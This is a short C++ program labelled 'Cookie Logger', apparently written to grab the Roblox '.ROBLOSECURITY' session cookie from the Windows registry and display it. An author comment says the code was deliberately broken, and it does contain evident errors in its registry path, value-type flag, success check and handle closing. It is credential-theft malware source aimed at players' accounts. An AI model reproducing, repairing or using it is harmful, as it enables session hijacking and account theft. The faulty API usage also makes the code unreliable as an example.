#include <Windows.h>

// I obviously broke this code so skids can't use it; I'm not an idiot. - H3x0R
int main()
{
	HKEY DomainKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Roblox\\RobloxStudioBrowser", NULL, KEY_READ, &DomainKey) == ERROR_SUCCESS)
	{
		char RobloSecurity[1024];
		DWORD RSLen = sizeof(RobloSecurity);

		if (RegGetValueA(DomainKey, "roblox.com", ".ROBLOSECURITY", RRF_RT_DWORD, nullptr, &RobloSecurity, &RSLen))
		{
			RobloSecurity[1023] = 0;
			MessageBoxA(NULL, RobloSecurity, "Cookie Logger", NULL);
			CloseHandle(DomainKey);
			return 0;
		}

		CloseHandle(DomainKey);
	}

	MessageBoxA(NULL, "Unable to grab key.", "Cookie Logger", NULL);
	return -1;
}
